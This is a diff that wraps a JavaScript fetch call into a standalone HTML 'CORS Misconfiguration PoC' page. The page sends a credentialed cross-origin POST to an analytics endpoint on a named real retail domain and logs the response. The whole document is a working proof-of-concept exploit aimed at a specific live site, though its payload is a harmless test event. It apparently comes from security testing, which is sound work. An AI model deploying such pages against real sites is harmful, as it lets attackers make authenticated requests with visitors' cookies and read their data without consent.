@@ -1,20 +1,33 @@
-fetch("https://ar.tienda.dell.com/.well-known/shopify/monorail/unstable/produce_batch", {
-  method: "POST",
-  credentials: "include",
-  headers: {
-    "Content-Type": "application/json"
-  },
-  body: JSON.stringify({
-    events: [
-      {
-        schema_id: "test_schema",
-        payload: {
-          test: "CORS POC Exploit"
-        }
-      }
-    ]
-  })
-})
-.then(response => response.text())
-.then(data => console.log("Response:", data))
-.catch(err => console.error("Error:", err));
+<!DOCTYPE html>
+<html>
+<head>
+  <title>CORS Misconfiguration PoC</title>
+</head>
+<body>
+  <h1>CORS Misconfiguration PoC</h1>
+  <p>Check the browser console for the response.</p>
+
+  <script>
+    fetch("https://ar.tienda.dell.com/.well-known/shopify/monorail/unstable/produce_batch", {
+      method: "POST",
+      credentials: "include",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        events: [
+          {
+            schema_id: "test_schema",
+            payload: {
+              test: "CORS POC Exploit"
+            }
+          }
+        ]
+      })
+    })
+    .then(response => response.text())
+    .then(data => console.log("Response:", data))
+    .catch(err => console.error("Error:", err));
+  </script>
+</body>
+</html>
